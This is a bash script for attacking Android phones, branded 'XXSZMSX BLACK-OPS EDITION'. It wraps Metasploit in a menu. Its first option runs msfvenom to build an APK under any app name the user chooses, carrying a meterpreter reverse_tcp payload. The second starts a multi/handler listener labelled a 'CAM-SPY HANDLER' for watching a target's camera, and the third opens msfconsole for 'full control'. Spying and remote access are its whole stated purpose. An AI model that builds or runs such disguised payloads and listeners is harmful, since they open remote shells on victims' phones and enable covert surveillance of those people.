#!/bin/bash

# --- XXSZMSX BLACK-OPS EDITION ---
# POWERFUL - STABLE - LIGHTWEIGHT
# AUTHOR: MAZEN

# COLORS (BLOOD RED & DARK GREY)
R='\033[1;31m'
G='\033[1;30m'
N='\033[0m'

clear

# --- THE LOGO (STAYING VISIBLE) ---
echo -e "${R}"
echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗███████╗██╗  ██╗"
echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║██╔════╝╚██╗██╔╝"
echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║███████╗ ╚███╔╝ "
echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║╚════██║ ██╔██╗ "
echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║███████║██╔╝ ██╗"
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${G}  -----------------------------------------------------------"
echo -e "  [ SYSTEM ]: XXSZMSX ENGINE v4.0 (EXPLOIT & CONTROL)"
echo -e "  [ STATUS ]: STEALTH MODE ACTIVE"
echo -e "  -----------------------------------------------------------${N}"

# --- SELECTIONS ---
echo -e "${R}[1]${N} GENERATE ANDROID PAYLOAD (APK BUILDER)"
echo -e "${R}[2]${N} MONITOR TARGET CAMERA (LIVE STREAM)"
echo -e "${R}[3]${N} ESTABLISH REMOTE ACCESS (FULL CONTROL)"
echo -e "${R}[0]${N} EXIT"

echo -en "\n${R}>> ${N}"
read opt

case $opt in
    1)
        echo -e "\n${R}[!] INITIALIZING PAYLOAD ENGINE...${N}"
        read -p "APP NAME: " name
        read -p "LHOST: " lh
        read -p "LPORT: " lp
        # Optimized msfvenom command
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R -o "$name.apk"
        echo -e "${R}[+] SUCCESS: $name.apk IS READY.${N}"
        ;;
    2)
        echo -e "\n${R}[!] LAUNCHING CAM-SPY HANDLER...${N}"
        read -p "LHOST: " lh
        read -p "LPORT: " lp
        msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lh; set LPORT $lp; set EXITONSESSION false; exploit -j -z"
        ;;
    3)
        echo -e "\n${R}[!] OPENING COMMAND CENTER...${N}"
        msfconsole -q
        ;;
    0)
        exit
        ;;
    *)
        exec bash "$0"
        ;;
esac
